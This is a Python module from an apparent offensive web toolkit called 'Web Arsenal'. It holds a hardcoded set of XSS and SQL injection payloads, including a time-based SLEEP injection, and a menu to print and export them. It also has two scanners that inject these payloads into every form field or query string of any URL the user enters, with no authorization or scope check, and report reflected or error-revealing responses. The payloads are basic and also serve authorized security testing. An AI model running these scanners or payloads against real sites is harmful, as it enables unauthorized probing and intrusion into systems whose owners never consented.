# core/web.py
import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from utils.reporter import write_html_section

# --- Payload Data ---
PAYLOADS = {
    "xss": {
        "description": "Cross-Site Scripting (XSS) payloads.",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<'';!--\"<XSS>=&{()}",
            "<img src=x onerror=alert('XSS')>",
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
        ]
    },
    "sqli": {
        "description": "SQL Injection (SQLi) payloads.",
        "payloads": [
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "' OR 'a'='a",
            "') OR ('a'='a",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))b)",
        ]
    }
}

# --- Payload Generator Functions ---
def display_payloads(category):
    if category not in PAYLOADS:
        print(f"[❌] Invalid category: {category}")
        return
    payload_data = PAYLOADS[category]
    print(f"\n[🎯 Payloads for: {category.upper()}]")
    print(f"Description: {payload_data['description']}\n")
    for i, payload in enumerate(payload_data['payloads'], 1):
        print(f"[{i:02d}] {payload}")
    print("\n[?] Options: [S]ave to file, [B]ack")
    choice = input("\nSelect an option: ").strip().lower()
    if choice == 's':
        save_payloads_to_file(category, payload_data['payloads'])

def save_payloads_to_file(category, payloads):
    if not os.path.exists('output'):
        os.makedirs('output')
    filename = f"output/{category}_payloads.txt"
    try:
        with open(filename, 'w') as f:
            for payload in payloads:
                f.write(payload + '\n')
        print(f"\n[✔️] Payloads saved to: {filename}")
    except Exception as e:
        print(f"\n[❌] Failed to save file: {e}")
    input("\nPress Enter to return...")

def run_payload_generator():
    while True:
        print("\n[🧬 Payload Generator]")
        print("Select a payload category to view and export:\n")
        categories = list(PAYLOADS.keys())
        for i, category in enumerate(categories, 1):
            print(f"[{i}] {category.upper()} - {PAYLOADS[category]['description']}")
        print(f"[{len(categories) + 1}] Back to Web Arsenal Menu")
        choice = input("\nSelect an option: ").strip()
        if choice.isdigit():
            choice_num = int(choice)
            if 1 <= choice_num <= len(categories):
                display_payloads(categories[choice_num - 1])
            elif choice_num == len(categories) + 1:
                break
        else:
            input("Invalid choice. Press Enter...")

# --- Web Vulnerability Scanner Functions ---
def find_forms(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException as e:
        print(f"[❌] Failed to fetch URL: {e}")
        return []

def run_xss_scanner():
    print("\n[💉 Reflected XSS Scanner]")
    url = input("Enter the target URL to scan for forms: ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    forms = find_forms(url)
    if not forms:
        print("[!] No forms found on the page.")
        input("Press Enter to return...")
        return
    print(f"\n[🔍] Found {len(forms)} form(s). Testing for XSS...")
    xss_payloads = PAYLOADS["xss"]["payloads"]
    vulnerable_forms = []
    for form in forms:
        action = form.get("action")
        post_url = urljoin(url, action)
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        data = {i.get("name"): "test" for i in inputs if i.get("name")}
        if not data: continue
        for payload in xss_payloads:
            test_data = data.copy()
            for key in test_data: test_data[key] = payload
            try:
                response = requests.post(post_url, data=test_data, timeout=5) if method == "post" else requests.get(post_url, params=test_data, timeout=5)
                if payload in response.text:
                    print(f"[🚨 VULNERABLE] XSS found at: {post_url} with payload: {payload}")
                    vulnerable_forms.append((post_url, action, payload))
                    break
            except requests.RequestException:
                break
    if vulnerable_forms:
        lines = [f"URL: {f[0]}, Form: {f[1]}, Payload: {f[2]}" for f in vulnerable_forms]
        write_html_section("Reflected XSS Vulnerabilities", lines)
        print("\n[💾] Vulnerabilities saved to report.html")
    else:
        print("\n[✔️] No simple reflected XSS vulnerabilities found.")
    input("\nPress Enter to return...")

def run_sqli_scanner():
    print("\n[💉 Error-Based SQLi Scanner]")
    url = input("Enter URL with a parameter (e.g., http://test.com/cat.php?id=1): ").strip()
    if '?' not in url:
        print("[❌] URL must have a query string (e.g., ?id=1).")
        input("Press Enter to return...")
        return
    print(f"\n[🔍] Testing for error-based SQLi on: {url}")
    sqli_payloads = PAYLOADS["sqli"]["payloads"]
    sql_errors = ["you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark", "quoted string not properly terminated"]
    vulnerable = False
    for payload in sqli_payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url, timeout=5)
            for error in sql_errors:
                if error in response.text.lower():
                    print(f"[🚨 VULNERABLE] SQLi detected at: {url} with payload: {payload}")
                    write_html_section("SQL Injection Vulnerability", [f"URL: {url}", f"Payload: {payload}"])
                    print("[💾] Vulnerability saved to report.html")
                    vulnerable = True
                    break
            if vulnerable: break
        except requests.RequestException:
            pass
    if not vulnerable:
        print("\n[✔️] No simple error-based SQLi vulnerabilities found.")
    input("\nPress Enter to return...")

def run_vulnerability_scanner():
    while True:
        print("\n[⚔️ Web Vulnerability Scanner]")
        print("[1] Reflected XSS Scanner")
        print("[2] Error-Based SQLi Scanner")
        print("[3] Back to Web Arsenal Menu")
        choice = input("Select an option: ").strip()
        if choice == '1': run_xss_scanner()
        elif choice == '2': run_sqli_scanner()
        elif choice == '3': break
        else: input("Invalid choice. Press Enter...")

# --- Main Entry Point for Web Arsenal ---
def run():
    while True:
        print("\n[⚔️ Web Arsenal]")
        print("[1] Web Vulnerability Scanner")
        print("[2] Payload Generator")
        print("[3] Back to Main Menu")
        choice = input("\nSelect an option: ").strip()
        if choice == '1':
            run_vulnerability_scanner()
        elif choice == '2':
            run_payload_generator()
        elif choice == '3':
            break
        else:
            input("Invalid choice. Press Enter to try again.")